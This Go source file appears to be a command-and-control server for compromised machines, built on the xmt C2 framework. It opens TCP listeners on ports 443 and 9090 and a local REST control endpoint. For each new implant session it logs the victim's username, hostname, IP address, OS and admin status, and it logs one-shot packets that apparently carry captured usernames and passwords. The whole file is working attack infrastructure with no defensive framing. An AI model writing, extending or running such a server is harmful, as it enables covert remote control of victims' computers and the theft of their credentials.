package main

import (
	"encoding/json"

	"github.com/PurpleSec/logx"
	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/c2/cfg"
	"github.com/iDigitalFlame/xmt/c2/rest"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/device"
)

var logUser logx.Log

var configTCP = []byte{}

func main() {
	f, err := logx.File("/tmp/storm.log", logx.Append, logx.Debug)
	if err != nil {
		panic(err)
	}
	if logUser, err = logx.File("/tmp/storm-extra.log", logx.Append, logx.Trace); err != nil {
		panic(err)
	}
	c2.Default.SetLog(logx.Multiple(f, logx.Console(logx.Debug)))
	c2.Default.New = newSession
	c2.Default.Oneshot = newOneshot

	if err := startTCPListener("tcp-alt", "172.16.10.184:9090"); err != nil {
		panic("tcp-alt listen " + err.Error())
	}
	if err := startTCPListener("tcp", "172.16.10.184:443"); err != nil {
		panic("tcp listen " + err.Error())
	}

	r := rest.New(c2.Default, "")
	go r.Listen("127.0.0.1:7771")

	c2.Default.Wait()
	r.Close()
	c2.Default.Close()
}
func newSession(s *c2.Session) {
	d := map[string]string{
		"username":  s.Device.User,
		"os":        s.Device.Version,
		"hostname":  s.Device.Hostname,
		"ipaddress": ip(s.Device),
	}
	if s.Device.Elevated {
		d["username"] = "*" + d["username"]
	}
	b, _ := json.Marshal(d)
	logUser.Info(string(b))
	logUser.Info(
		"New Session: Host: %s (%s), User: %s (Admin=%t), OS: %s",
		s.Device.Hostname, d["ipaddress"], s.Device.User, s.Device.Elevated, s.Device.Version,
	)
}
func newOneshot(n *com.Packet) {
	var (
		u, _ = n.StringVal()
		p, _ = n.StringVal()
		d    device.Machine
	)
	d.UnmarshalStream(n)
	logUser.Warning(
		"%q [%s] from %s (%s)", u, p, d.Hostname, ip(d),
	)
}
func ip(d device.Machine) string {
	for _, n := range d.Network {
		for _, a := range n.Address {
			if a.IsZero() || a.IsLinkLocalUnicast() || a.IsLoopback() {
				continue
			}
			return a.String()
		}
	}
	return ""
}
func startTCPListener(s, a string) error {
	p, err := cfg.Raw(configTCP)
	if err != nil {
		return err
	}
	if _, err = c2.Default.Listen(s, a, com.TCP, p); err != nil {
		return err
	}
	return nil
}
